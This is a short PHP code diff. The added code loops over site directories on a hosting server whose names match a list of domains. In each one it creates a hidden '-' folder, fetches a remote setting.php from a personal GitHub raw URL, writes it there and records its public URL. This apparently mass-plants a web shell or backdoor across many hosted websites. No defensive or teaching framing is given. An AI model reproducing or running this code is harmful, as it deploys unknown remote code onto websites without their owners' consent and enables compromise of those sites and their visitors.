@@ -22,9 +22,29 @@ foreach ($homes as $key => $home) {
 
         $currentDomain = str_replace('_', '.', $path);
         if (in_array($currentDomain, $domains)) {
-            $targets[] = $currentPath . $path;
+            $targets[] = [
+                'path' => $currentPath . $path,
+                'domain' => $currentDomain,
+            ];
         }
     }
 }
 
-dd($targets);
+$results = [];
+
+foreach ($targets as $target) {
+    mkdir($target['path'] . '/-');
+
+    $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/setting.php');
+    $file = $target['path'] . '/-/setting.php';
+    $res = file_put_contents($file, $response);
+
+    $results[$target['domain']] = [
+        'size' => $res,
+        'domain' => $target['domain'],
+        'path' => $target['path'],
+        'url' => $target['domain'] . '/-/setting.php'
+    ];
+}
+
+dd($results);
